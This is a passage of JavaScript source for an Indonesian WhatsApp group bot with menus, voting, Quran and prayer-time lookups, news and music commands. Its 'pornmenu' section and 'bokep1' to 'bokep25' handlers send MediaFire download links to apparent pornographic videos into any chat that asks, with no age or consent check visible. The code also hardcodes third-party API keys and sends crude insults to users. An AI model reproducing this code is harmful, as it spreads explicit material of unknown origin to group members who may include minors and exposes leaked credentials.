▹  ${prefix}suit *batu/kertas/gunting*
`

sendButMessage(from, wibu, `created Kahfz Ganteng`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break;
case 'stickermenu':
case  'stikermenu':
wibu = ` 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
▹  ${prefix}dadu
▹  ${prefix}bucinstick
▹  ${prefix}doge
▹  ${prefix}toimg
▹  ${prefix}patrick
▹  ${prefix}ttg *teks*
▹  ${prefix}attp *teks*
▹  ${prefix}stickeranime
▹  ${prefix}semoji *emoji*
▹  ${prefix}sticker *reply foto/video*
▹  ${prefix}smeme *teks|teks*
▹  ${prefix}swm *pack|author*
▹  ${prefix}take *pack|author* 
▹  ${prefix}tovideo *reply sgif*
▹  ${prefix}triggered *reply image*
`



sendButMessage(from, wibu, `created follow @Kahfz_13`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break;
case 'funmenu':
case  'menufun':
wibu =` 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
▹  ${prefix}mining
▹  ${prefix}cekwatak
▹  ${prefix}cekmati [nama]
▹  ${prefix}wangy [nama]
▹  ${prefix}citacita
▹  ${prefix}toxic
▹  ${prefix}truth
▹  ${prefix}dare
▹  ${prefix}apakah
▹  ${prefix}bisakah
▹  ${prefix}kapankah
▹  ${prefix}rate
▹  ${prefix}jadian
▹  ${prefix}cantik
▹  ${prefix}ganteng
▹  ${prefix}beban
▹  ${prefix}babi
▹  ${prefix}cekganteng
▹  ${prefix}cekcantik

`
sendButMessage(from, wibu, `created Kahfz Ganteng`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break;
case "delvote":
if (fs.existsSync('./lib/vote/' + from + '.json') && fs.existsSync('./lib/' + from + '.json')) {
  deleteVote(from);
  reply("Sukses Menghapus sesi Voting Di Grup Ini");
} else {
  reply("Belum ada sesi yang dimulai")
}
break;
case "voting": // tambahin if (!isGroupAdmins) return; kalau mau khusus admin
if (!isGroup) return reply(mess.only.group);
if (fs.existsSync('./lib/vote/' + from + '.json') && fs.existsSync('./lib/' + from + '.json')) {
  reply("Sesi vote sedang berlangsung")
} else {
  if (!q)
 return reply(
"*Voting*\n\n" +
prefix +
"voting @tag target | reason  | 1 (1 = 1 Menit)"
);
  if (
 kahfz.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 ||
 kahfz.message.extendedTextMessage.contextInfo == null
 ) {
 let id = kahfz.message.extendedTextMessage.contextInfo.mentionedJid[0];
  split = q.replace("@", "").split("|");
  if (!Number(split[2]))
 return reply(
"masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit"
);
  await mentions(
 "Vote " +
 "@" +
 id.split("@")[0] +
 " Di Mulai" +
 "\n\n" +
 `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,
 [id],
 true
 );
  addVote(from, split[1], split[0], split[2], reply);
}
 }
 break;
 case 'infomenu':
 case  'menuinfo':
 wibu = ` 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
▹  ${prefix}update
▹  ${prefix}level
▹  ${prefix}rules
▹  ${prefix}profile
▹  ${prefix}waktu
▹  ${prefix}botstat
▹  ${prefix}sewabot
▹  ${prefix}listsewa
▹  ${prefix}owner
▹  ${prefix}ping
▹  ${prefix}runtime
▹  ${prefix}donasi
▹  ${prefix}leaderboard
▹  ${prefix}cekpremium
▹  ${prefix}listpremium
▹  ${prefix}sourcecode
▹  ${prefix}bugreport *keluhan*`

 sendButMessage(from, wibu, `created Kahfz Ganteng`, [
 {
buttonId: noprefix ? "menu" : "!"+"menu",
buttonText: {
  displayText: `⬡ BACK TO MENU `,
},
type: 1,
 },]);
 break;
 case 'pornmenu':
 case  '181+':
 txtt =`Hai Kak ${pushname}\nFitur Akan Muncul Dalam 5 Detik Karna Untuk Mengurangi Spam - Spam Bot!!!`

 buttons = [{buttonId: noprefix ? "yobanh" : "!"+"yobang",buttonText:{displayText: 'OK BANG😎'} ,type:1}]
 buttonsMessage = {
contentText: `${txtt}`,
footerText: 'Jangan Spam Juga Ajg',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
  await sleep(5000)
 groups = kahfzz.chats.array.filter(v => v.jid.endsWith('g.us'))
 privat = kahfzz.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
 ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
 charger = `${charging ? 'lagi dicas' : 'ga dicas'}`
 uptime = process.uptime();
 timestampe = speed();
 totalChat = await kahfzz.chats.all()
 latensie = speed() - timestampe
 total = math(`${groups.length}*${privat.length}`)


 menu =`${botName}

⬡ 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
▹ ${prefix}bkp *random*
▹ ${prefix}bokep1
▹ ${prefix}bokep2
▹ ${prefix}bokep3
▹ ${prefix}bokep4
▹ ${prefix}bokep5
▹ ${prefix}bokep6
▹ ${prefix}bokep7
▹ ${prefix}bokep8
▹ ${prefix}bokep9
▹ ${prefix}bokep10
▹ ${prefix}bokep11
▹ ${prefix}bokep12
▹ ${prefix}bokep13
▹ ${prefix}bokep14
▹ ${prefix}bokep15
▹ ${prefix}bokep16
▹ ${prefix}bokep17
▹ ${prefix}bokep18
▹ ${prefix}bokep19
▹ ${prefix}bokep20
▹ ${prefix}bokep21
▹ ${prefix}bokep22
▹ ${prefix}bokep23
▹ ${prefix}bokep24
▹ ${prefix}bokep25
 `

 sendButMessage(from, menu, `created Kahfz Bot Ganteng`, [
 {
buttonId: noprefix ? "menu" : "!"+"menu",
buttonText: {
  displayText: `⬡ BACK TO MENU `,
},
type: 1,
 },]);
 break;
//addfiturbokep
case 'bokep1':				 

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/h2nygxbyb6n9cyo/VID-20210107-WA1468.mp4/file' , text, {quoted: freply})
break
case 'bokep2':

kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/pk8hozohzdc076c/VID-20210107-WA1466.mp4/file' , text, {quoted: freply})
break
case 'bokep3':	

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/112q3u286tnvzjo/VID-20210107-WA1467.3gp/file', text, {quoted: reply })				 
break
case 'bokep4':	

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/arpphhxsv94ak0r/VID-20210107-WA1462.mp4/file' , text, {quoted: freply})				
break
case 'bokep5':	

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/us3f4j62emftbrf/VID-20210107-WA1463.mp4/file' , text, {quoted: freply})				
break
case 'bokep6':	

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/v4033tkl16hgf2b/VID-20210107-WA1459.mp4/file' , text, {quoted: freply})				
break
case 'bokep7':

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/3scnim6d1x4b8ie/VID-20210107-WA1461.mp4/file' , text, {quoted: freply})				
break
case 'bokep8':	

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/dx9tklonu0eq36w/VID-20210107-WA1464.mp4/file' , text, {quoted: freply})				
break

case 'bokep10':	

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/snwja297dv4zvtl/VID-20210107-WA0036.mp4/file' , text, {quoted: freply})				
break
case 'bokep11':	

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/60dqek0mqhyt6rn/VID-20210107-WA1530.mp4/file' , text, {quoted: freply})				
break
case 'bokep12':	

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ni2mcdknb6zn50t/VID-20210107-WA1532.mp4/file' , text, {quoted: freply})				
break
case 'bokep13':	

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/i9t96lrmd9lm71z/VID-20210107-WA1542.mp4/file' , text, {quoted: freply})				
break
case 'bokep14':	

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/tjqdfmp8g08dt4e/VID-20210107-WA1536.mp4/file' , text, {quoted: freply})				
break
case 'bokep15':

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/x034q0s16u9vyhy/VID-20210107-WA1537.mp4/file' , text, {quoted: freply})				
break
case 'bokep16':

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/mgmynqghjnon2q7/VID-20210107-WA1533.mp4/file' , text, {quoted: freply})				
break
case 'bokep17':	

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/ecly00at6adxs20/VID-20210107-WA1540.mp4/file' , text, {quoted: freply})				
break
case 'bokep18':

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/7qkn8nuog22jsco/VID-20210107-WA1534.mp4/file' , text, {quoted: freply})				
break
case 'bokep19':				 

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/vza5uaben93dfdr/VID-20210107-WA1527.mp4/file' , text, {quoted: freply})				
break
case 'bokep20':			

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/l7uzd4v9p95wpeb/VID-20210107-WA1541.mp4/file' , text, {quoted: freply})				
break
case 'bokep21':				 

qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/icpnxsr18j6l2pp/VID-20210107-WA1528.mp4/file' , text, {quoted: freply})				
break
case 'bokep22':		
txtt =`Hai Kak ${pushname}\nFitur Akan Muncul Dalam 5 Detik Karna Untuk Mengurangi Spam - Spam Bot!!!`

 buttons = [{buttonId: noprefix ? "yobang" : "!"+"yobang",buttonText:{displayText: 'OK BANG😎'} ,type:1}]
 buttonsMessage = {
contentText: `${txtt}`,
footerText: 'Jangan Spam Juga Ajg',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
  await sleep(5000)
qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/cscj9taoq5s5oj9/VID-20210107-WA1538.mp4/file' , text, {quoted: freply})				
break
case 'bokep23':	
txtt =`Hai Kak ${pushname}\nFitur Akan Muncul Dalam 5 Detik Karna Untuk Mengurangi Spam - Spam Bot!!!`

 buttons = [{buttonId: noprefix ? "yobang" : "!"+"yobang",buttonText:{displayText: 'OK BANG😎'} ,type:1}]
 buttonsMessage = {
contentText: `${txtt}`,
footerText: 'Jangan Spam Juga Ajg',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
  await sleep(5000)
qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \n\nhttps://www.mediafire.com/file/saer161lthn4sy3/VID-20210107-WA1525.mp4/file' , text, {quoted: freply})				
break
case 'bokep24':				 
txtt =`Hai Kak ${pushname}\nFitur Akan Muncul Dalam 5 Detik Karna Untuk Mengurangi Spam - Spam Bot!!!`

 buttons = [{buttonId: noprefix ? "yobang" : "!"+"yobang",buttonText:{displayText: 'OK BANG😎'} ,type:1}]
 buttonsMessage = {
contentText: `${txtt}`,
footerText: 'Jangan Spam Juga Ajg',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
  await sleep(5000)
qute = fs.readFileSync('media/Menu.jpg') 
kahfzz.sendMessage(from,  '*SEMOGA DI BERI HIDAYAH*\nLink Download \\nhttps://www.mediafire.com/file/9jy3nj2b2ljjzxb/VID-20210107-WA1539.mp4/file' , text, {quoted: freply})				
break


break
case 'islammenu':
case  'islamimenu':
tod22 = `
Wait Menu Akan Muncul Dalam 5 Detik Untuk Menghindari Spam!!
`
kahfzz.sendMessage(from, { contentText: `${tod22}`, footerText: ` © *_Kahfz Bot_*`,buttons: [{ buttonId: noprefix ? "yobang" : "!"+"yobang", buttonText: { displayText: 'OKE BANG 😎' }, type: 1 },{ buttonId: noprefix ? "sewabot" : "!"+"sewabot", buttonText: { displayText: 'SEWA BOT' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
  await sleep(7000)

menu =` ${botName}

Hai kak 👋🏻 ${pushname}
Jangan lupa bersyukur untuk hari ini ~
Silahkan pilih tabel di bawah ini , jika tidak support silahkan ketik ! command 

 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
▹ ${prefix}listsurah
▹ ${prefix}alquran
▹ ${prefix}alquranaudio
▹ ${prefix}asmaulhusna
▹ ${prefix}kisahnabi
▹ ${prefix}jadwalsholat`
sendButMessage(from, menu, `created Kahfz Bot`, [
{
 buttonId: noprefix ? "menu" : "!"+"menu",
 buttonText: {
displayText: `⬡ BACK TO MENU `,
 },
 type: 1,
  },]);
break;  
case 'qutet':
tod22 = `
Wait Menu Akan Muncul Dalam 5 Detik Untuk Menghindari Spam!!
`
kahfzz.sendMessage(from, { contentText: `${tod22}`, footerText: ` © *_Kahfz Bot_*`,buttons: [{ buttonId: noprefix ? "yobang" : "!"+"yobang", buttonText: { displayText: 'OKE BANG 😎' }, type: 1 },{ buttonId: noprefix ? "sewabot" : "!"+"sewabot", buttonText: { displayText: 'SEWA BOT' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: ikyads, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
  await sleep(7000)
menu =` ${botName}

Hai kak 👋🏻 ${pushname}
Jangan lupa bersyukur untuk hari ini ~
Silahkan pilih tabel di bawah ini , jika tidak support silahkan ketik ! command 

 𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔
▹ ${prefix}quotesislami
▹ !quotesmotivasi`
sendButMessage(from, menu, `created Kahfz Bot`, [
{
 buttonId: noprefix ? "menu" : "!"+"menu",
 buttonText: {
displayText: `⬡ BACK TO MENU `,
 },
 type: 1,
  },]);
break;  
case 'command':
list = []
listmenu = [`groupmenu`,`photoxy`,`qutet`,`ephoto`,`randomimage`,`wibu2`,`storymenu`,`porno`,`berita112`,`randomtext`,`botan`,`islammenu`,`wibumenu`,`stickermenu`,`ownermenu`,`gamemenu`,`funmenu`,`downloadmenu`,`infomenu`,`othermenu`,`owner`,`kahfzzgroup`,`sewabot`,`imfot1`]
listmenuu = [`Menu Group`,`Photo Oky`,`Quotes Menu`,`Ephoto Menu`,`Random Image`,`Nsfw Anime`,`Movie&Story`,`18+ Menu`,`Berita Menu`,`RandomText`,`Anonmyus Chat`,`Islam Menu`,`Wibu Menu`,`Sticker Menu`,`Owner Command`,`Game Menu`,`For Fun Menu`,`Downloader`,`Info Menu`,`Menu Lainnya`,`OwnerBot`,`Official Group`,`Rent This Bot`,`Info Global Menu`]
nombor = 1
startnum = 0
for (let x of listmenu) {
  const yy = {title: 'き⃟👑menu ke-' + nombor++,
  rows: [
  {
title: `${listmenuu[startnum++]}`,
description: ``,
rowId: `${prefix}${x}`
 }
 ]
  }
  list.push(yy)
}
listmsg(from, `${ucapanWaktu} ${pushname} 👋

  Yes Ini Bot Sad :)
  `,`き⃟🐣 Day : ${week} ${weton}\nき⃟🐥 Date : ${date}  `, list, { quoted: troli})
break
case 'berita112':
txtt =`Hai Kak ${pushname}\nMau Berita Yang Mana Nih😎`

 buttons = [{buttonId: noprefix ? "liputan6" : "!"+"liputan6",buttonText:{displayText: 'LIPUTAN 6'},type:1},{buttonId:noprefix ? "tribunews" : "!"+"tribunews", buttonText:{displayText:'TRIBUNEWS'},type:1},{buttonId:noprefix ? "foxnews" : "!"+"foxnews", buttonText:{displayText:'FOXNEWS'},type:1}]
 buttonsMessage = {
contentText: `${txtt}`,
footerText: 'Jangan Lupa di Baca Bukan Di coba Fitur Nya Doang Ajg',
buttons: buttons,
headerType: 1
 }
 prep = await kahfzz.prepareMessageFromContent(from,{buttonsMessage},{})
 kahfzz.relayWAMessage(prep)
 break

///ISLAMI MENU  

// Islami //
case 'listsurah':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/quran?apikey=Mythia-Chan`)
get_result = get_result.result
ini_txt = 'List Surah:\n'
for (var x in get_result) {
  ini_txt += `${x}. ${get_result[x]}\n`
}
reply(ini_txt)
break
case 'alquran':
if (args.length < 1) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10 or ${prefix + command} 18/1-10`)
  urls = (`https://api.lolhuman.xyz/api/quran/${args[0]}?apikey=Mythia-Chan`)
quran = await fetchJson(urls)
result = quran.result
ayat = result.ayat
ini_txt = `QS. ${result.surah} : 1-${ayat.length}\n\n`
for (var x of ayat) {
  arab = x.arab
  nomor = x.ayat
  latin = x.latin
  indo = x.indonesia
  ini_txt += `${arab}\n${nomor}. ${latin}\n${indo}\n\n`
}
ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
ini_txt = ini_txt.replace(/<strong>/g, "").replace(/<\/strong>/g, "")
ini_txt = ini_txt.replace(/<u>/g, "").replace(/<\/u>/g, "")
sendButMessage(from, ini_txt, `created Kahfz Ganteng`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break
case 'yobang':
titid22 = `
*_Apa Ngentot Tolol Lu Pencet_*\n*_Button Wait..._*\n*_Sumpah Tolol Ajg_*
`
sendButMessage(from, titid22, `created Kahfz Ganteng`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break 
case 'alquranaudio':
if (args.length == 0) return reply(`Example: ${prefix + command} 18 or ${prefix + command} 18/10`)
  surah = args[0]
ini_buffer = await getBuffer(`https://api.lolhuman.xyz/api/quran/audio/${surah}?apikey=Mythia-Chan`)
await kahfzz.sendMessage(from, ini_buffer, audio, { quoted: freply, mimetype: Mimetype.mp4Audio })
break
case 'asmaulhusna':
get_result = await fetchJson(`https://api.lolhuman.xyz/api/asmaulhusna?apikey=Mythia-Chan`)
get_result = get_result.result
ini_txt = `No : ${get_result.index}\n`
ini_txt += `Latin: ${get_result.latin}\n`
ini_txt += `Arab : ${get_result.ar}\n`
ini_txt += `Indonesia : ${get_result.id}\n`
ini_txt += `English : ${get_result.en}`
sendButMessage(from, ini_txt, `created Kahfz Ganteng`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break
case 'kisahnabi':
if (args.length == 0) return reply(`Example: ${prefix + command} Muhammad`)
  query = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/kisahnabi/${query}?apikey=Mythia-Chan`)
get_result = get_result.result
ini_txt = `Name : ${get_result.name}\n`
ini_txt += `Lahir : ${get_result.thn_kelahiran}\n`
ini_txt += `Umur : ${get_result.age}\n`
ini_txt += `Tempat : ${get_result.place}\n`
ini_txt += `Story : \n${get_result.story}`
sendButMessage(from, ini_txt, `created Kahfz Ganteng`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break
case 'jadwalsholat':
if (args.length == 0) return reply(`Example: ${prefix + command} Yogyakarta`)
  daerah = args.join(" ")
get_result = await fetchJson(`https://api.lolhuman.xyz/api/sholat/${daerah}?apikey=Mythia-Chan`)
get_result = get_result.result
ini_txt = `Wilayah : ${get_result.wilayah}\n`
ini_txt += `Tanggal : ${get_result.tanggal}\n`
ini_txt += `Sahur : ${get_result.sahur}\n`
ini_txt += `Imsak : ${get_result.imsak}\n`
ini_txt += `Subuh : ${get_result.subuh}\n`
ini_txt += `Terbit : ${get_result.terbit}\n`
ini_txt += `Dhuha : ${get_result.dhuha}\n`
ini_txt += `Dzuhur : ${get_result.dzuhur}\n`
ini_txt += `Ashar : ${get_result.ashar}\n`
ini_txt += `Maghrib : ${get_result.maghrib}\n`
ini_txt += `Isya : ${get_result.isya}`
sendButMessage(from, ini_txt, `created Kahfz Ganteng`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break
case 'carbon':

	if (args.length == 0) reply(`exampe : !carbon code|biru\n\nList Warna\n• biru\n• kuning\n• hitam\n• ping`)

            car = args.join(" ");

            var codee = car.split('|')[0]

			var kolor = car.split('|')[1]

            buffer = await getBuffer(`http://ziy.herokuapp.com/api/carbon?code=${codee}&color=${kolor}&apikey=ZiyKey`)

            kahfzz.sendMessage(from, buffer, image, { quoted: freply})

            break
case 'rules':
kahfzz.sendMessage(from, rulesBot(prefix), MessageType.text, {quoted: freply})
break
case 'infogempa':              
                get_result = await fetchJson(`http://api.lolhuman.xyz/api/infogempa?apikey=Mythia-Chan`)
                get_result = get_result.result
                ini_txt = `Lokasi : ${get_result.lokasi}\n`
                ini_txt += `Waktu : ${get_result.waktu}\n`
                ini_txt += `Potensi : ${get_result.potensi}\n`
                ini_txt += `Magnitude : ${get_result.magnitude}\n`
                ini_txt += `Kedalaman : ${get_result.kedalaman}\n`
                ini_txt += `Koordinat : ${get_result.koordinat}`
                get_buffer = await getBuffer(get_result.map)
                kahfzz.sendMessage(from, get_buffer, image, { quoted: freply, caption: ini_txt })
                reply(ini_txt)
                break
case 'jadwaltv':
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} RCTI`)
                    channel = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/jadwaltv/channel?apikey=IkyChan`)
                    get_result = get_result.result
                    ini_txt = `Jadwal TV ${channel.toUpperCase()}\n`
                    for (var x in get_result) {
                        ini_txt += `${x} - ${get_result[x]}\n`
                    }
                    reply(ini_txt)
                    break
case 'coronaindo':
if (!isRegistered) return reply(ind.only.daftarB)

ipnya = body.slice(16)

inf = await fetchJson(`https://api.dapuhy.ga/api/others/corona?negara=indonesia&apikey=NYXNGONTOL`)

buffer = await getBuffer(inf.result) 
pesannya = `🐣Info Corona Indonesia🐣\n\n🐥Kasus : ${inf.kasus}\n\n🐥Meninggal : ${inf.meninggal}\n\n🐥Sembuh : ${inf.sembuh}`

sendButMessage(from, pesannya, `created Kahfz Ganteng`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
break
case 'coronaglobal':

if (!isRegistered) return reply(ind.only.daftarB)

ipnya = body.slice(18)

inf = await fetchJson(`https://api.lolhuman.xyz/api/corona/global?apikey=Mythia-Chan`)

buffer = await getBuffer(inf.result)

pesannya = `🐣Info Corona Global🐣\n\n🐣Positif : ${inf.result.positif}\n\n🐥Meninggal : ${inf.result.meninggal}\n\n🐥Sembuh : ${inf.result.sembuh}\n\n🐥Dirawat : ${inf.result.dirawat}`

sendButMessage(from, pesannya, `created Kahfz Ganteng`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);

break
case 'infocoronaglobal':

if (!isRegistered) return reply(ind.only.daftarB)

ipnya = body.slice(18)

inf = await fetchJson(`https://api.lolhuman.xyz/api/corona/global?apikey=Mythia-Chan`)

buffer = await getBuffer(inf.result)

pesannya = `Info Corona Global\nPositif : ${inf.positif}\nMeninggal : ${inf.meninggal}\nSembuh : ${inf.sembuh}\nDirawat : ${inf.dirawat}`

kahfzz.sendMessage(from, pesannya, text, { quoted: freply})

break
case 'jooxplay':
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://api.lolhuman.xyz/api/jooxplay?apikey=${setting.lolkey}&query=${query}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.info.song}\n`
                    ini_txt += `Artists : ${get_result.info.singer}\n`
                    ini_txt += `Duration : ${get_result.info.duration}\n`
                    ini_txt += `Album : ${get_result.info.album}\n`
                    ini_txt += `Uploaded : ${get_result.info.date}\n`
                    ini_txt += `Lirik :\n ${get_result.lirik}\n`
                    thumbnail = await getBuffer(get_result.image)
                    kahfzz.sendMessage(from, thumbnail, image, { quoted: freply, caption: ini_txt })
                    get_audio = await getBuffer(get_result.audio[0].link)
                    kahfzz.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.info.song}.mp3`, quoted: freply })
                    break
    case 'spotify':
                    if (args.length == 0) return reply(`Contoh: ${prefix + command} https://open.spotify.com/track/0ZEYRVISCaqz5yamWZWzaA`)
                    url = args[0]
                    get_result = await fetchJson(`http://api.lolhuman.xyz/api/spotify?apikey=${setting.lolkey}&url=${url}`)
                    get_result = get_result.result
                    ini_txt = `Title : ${get_result.title}\n`
                    ini_txt += `Artists : ${get_result.artists}\n`
                    ini_txt += `Duration : ${get_result.duration}\n`
                    ini_txt += `Popularity : ${get_result.popularity}\n`
                    ini_txt += `Preview : ${get_result.preview_url}\n`
                    thumbnail = await getBuffer(get_result.thumbnail)
                    kahfzz.sendMessage(from, thumbnail, image, { quoted: freply, caption: ini_txt })
                    get_audio = await getBuffer(get_result.link[3].link)
                    kahfzz.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${get_result.title}.mp3`, quoted: freply })
                    break
case 'doaniat':

              if (args.length == 0) return reply(`Example: ${prefix + command} shubuh`)

              query = args.join(" ")

              asw = await fetchJson(`https://api.lolhuman.xyz/api/niatsholat/${query}?apikey=Mythia-Chan`)

              ngontol = await getBuffer(asw.result)  

              teksnyaa = `NIAT SHOLAT ${query}\n${asw.result}[ *NIAT SHOLAT BY KAHFZ BOTZ* ]` 

              kahfzz.sendMessage(from, teksnyaa, text, { quoted: freply})  

              break
case 'tribunews':
					
                 if (!isRegistered) return reply(mess.wait())
					kahfzz.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/tribunews?apikey=NYXNGONTOL`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Judul* : ${i.title}\n*Time* : ${i.time}\n*Link* : ${i.url}\n*Keterangan* : ${i.ket}\n=================\n`
					}
					sendButMessage(from, teks, `created Kahfz Ganteng`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
					break
case 'liputan6': 
                 if (!isRegistered) return reply('daftar dulu ajg')
					kahfzz.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://api.zeks.xyz/api/liputan6?apikey=NYXNGONTOL`, {method: 'get'})
					teks = '=================\n'
					for (let i of data.result) {
						teks += `*Judul* : ${i.title}\n*Url* : ${i.url}\n*Keterangan* : ${i.ket}\n*Category* : ${i.category}\n*Time* : ${i.time}\n=================\n`
					}
					sendButMessage(from, teks, `created Kahfz Ganteng`, [
{
  buttonId: noprefix ? "menu" : "!"+"menu",
  buttonText: {
 displayText: `⬡ BACK TO MENU `,
  },
  type: 1,
},]);
					break
case 'foxnews':

					data = await fetchJson(`https://api.zeks.xyz/api/foxnews?apikey=NYXNGONTOL`, {method: 'get'})

					teks = '𝗙𝗼𝘅 𝗻𝗲𝘄𝘀\n'

					for (let i of data.result) {

